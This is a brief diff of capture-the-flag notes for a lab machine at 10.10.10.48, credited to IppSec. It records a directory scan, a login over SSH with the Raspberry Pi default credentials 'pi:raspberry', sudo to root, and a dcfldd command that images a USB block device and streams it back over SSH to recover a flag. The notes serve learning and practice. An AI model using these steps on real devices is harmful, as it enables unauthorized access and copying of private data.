@@ -1,0 +1,9 @@
+//Based on IppSec
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.48 -o gobuster_root
+http://10.10.10.48/admin/index.php
+//Raspberry default creds
+pi : raspberry
+ssh pi@10.10.10.48
+sudo su			//got root, but flag is in usb (clue) -> /dev/sdb
+ssh pi@10.10.10.48 "sudo dcfldd if=/dev/sdb | gzip -1 -" | dcfldd of=pi.dd.gz
+strings sdb		//got the flag
